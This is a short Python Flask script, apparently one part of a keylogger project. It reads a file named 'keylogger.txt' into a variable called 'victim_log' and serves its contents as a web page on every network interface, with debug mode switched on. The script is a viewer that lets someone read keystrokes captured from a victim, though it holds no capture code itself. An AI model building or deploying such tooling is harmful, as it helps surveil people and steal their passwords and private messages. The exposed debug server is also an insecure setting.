from flask import Flask, render_template

app = Flask(__name__, template_folder = 'templates', static_url_path= '/')

@app.route("/")
    
def display_log():

    victim_log = ""

    try:

        with open("keylogger.txt", 'r') as f:

             victim_log =  f.read()

    except FileNotFoundError:

        print("Could not find the file make sure, it is present in your directory")

    return render_template('log.html', content=victim_log)

if __name__ == '__main__':

    app.run(debug=True, port=5000, host='0.0.0.0')

